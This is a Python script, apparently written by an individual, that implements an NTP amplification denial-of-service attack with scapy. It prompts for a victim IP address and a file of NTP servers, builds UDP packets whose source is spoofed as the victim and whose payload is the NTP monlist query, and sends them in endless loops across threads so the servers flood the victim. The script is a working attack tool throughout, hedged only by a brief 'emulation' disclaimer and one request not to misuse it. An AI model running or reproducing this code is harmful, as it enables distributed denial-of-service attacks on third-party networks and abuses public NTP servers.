#!/usr/bin/env python

'''

Disclaimer - This program emulates the behavior of NTP Amplification attack.
It is not necessarily the best solution coz I am not a developer by profession.
In other words, I generally use libraries or data structures that I am 
comfortable or familiar with. If you think there is an optimal method to do
this, then please share your ideas. I am always open to learning something
new.

Ron Nilekani
Rackspace, Texas
nilekani.raunaq@gmail.com

Please feel free to reach out to me incase if you have any suggestions.

'''


#Importing the scapy library into my local namespace
from scapy.all import *

import sys
import threading
import time

def Introduction():
	print
        print "NTP AMPLIFICATION ATTACKS:"
        print "MAKING MONLIST QUERY TO NTP SERVER USING IP ADDRESSING SPOOFING"
        print "NTP SERVER would flood the target with amplified amount of data in response"
        print "In order to stop the execution of this program, press CTRL-C"
        print
	
 
def how_to_use_script():
	'''
	This function expains how to use this script.
	'''
	print "Note: This script works for python 2.7.6 or above.\n"
	print "Make sure to install scapy library on your local machine"
	print "Please do not use this script for malicious reasons"
	

def file_operations(ntpserverfile):
	'''
	This function works on opening the NTP server file and putting all the addresses in List.

	'''
	
	ntplist = []

	# Creating a file handle and opening the ntpserver file in read only format.
        f = open(ntpserverfile, 'r')

        # Using file operations to store the list of IP addresses in a list
        # This is achieved using readlines method.
        ntplist = f.readlines()

        #Upon retrieving the data, we can close the file
        f.close()

  	return ntplist

def ntp_attack():
	'''
	This function obtains all the variables required to form a network packet.
	'''

	#Import global variables into this function
	global ntplist
	global current_server
	global target_address
	ntp_server = ntplist[current_server] 
	current_server = current_server + 1 
	
	# Pattern for NTP v2 Monlist Packet
	ntp_data_pattern = "\x17\x00\x03\x2a" + "\x00" * 4

	#Calling the scapy packet function.
	scapy_packet(ntp_server, target_address, ntp_data_pattern)
	         


def scapy_packet(ntp_server, target_address, ntp_data_pattern):
	'''
	This is the core function of our program where we build  arbitary network packets 
	and push them to our victim.
	'''
	#Scapy packet format + load = 'data' <-- contains the mon-list command
	#BUILDING THE PACKET
	packet = IP(dst=ntp_server,src=target_address)/UDP(sport=51147,dport=123)/Raw(load=ntp_data_pattern)
	
	#PACKET FORMAT:
	print
	print "PACKET FORMAT:\n"
	ls(packet)

	#SENDING THE PACKET
	print 
	print "SENDING THE PACKET:\n"
	print 
	send(packet,loop=1)
	  
def thread_function(numberthreads):
	'''
 	Calling the  function(ntp_attack) inside a thread
	THIS FUNCTION WILL SPAWN THREADS PER NTP_SERVER
    	SYNTAX REFERENCED FROM http://pymotw.com/2/threading/ 
    	'''
	
	threads = []
	for i in range(int(numberthreads)):
                thread = threading.Thread(target=ntp_attack)
                thread.daemon = True # This is tied to stopping the program using CTRL-C as indica$
                threads.append(thread)
                thread.start()


#Applying the technique to allow importable and executable code to co-exist

if __name__ == "__main__":
	
	Introduction()
	how_to_use_script()

	#Initializing the variables. Taking the input from the user in form of arguments.

	target_address = raw_input("Enter the victim address:\n")
	
	ntpserverfile = raw_input("Enter the name of the file containing the list of NTP Servers:\n")

	numberthreads = raw_input("Enter the number of threads you want to use(Remember, it should be the same as the list of NTP servers:\n")
	
		
	
	#Creating and Initializing the list.
	current_server = 0
	

	# Performing the file operations to retrieve list of NTP servers	
	ntplist = file_operations(ntpserverfile)	
	
	#Calling the thread function
	thread_function(numberthreads)

	
	# In order to avoid utilization 100% CPU, I am adding delay to  the code execution by one second
	while True:
		time.sleep(1)

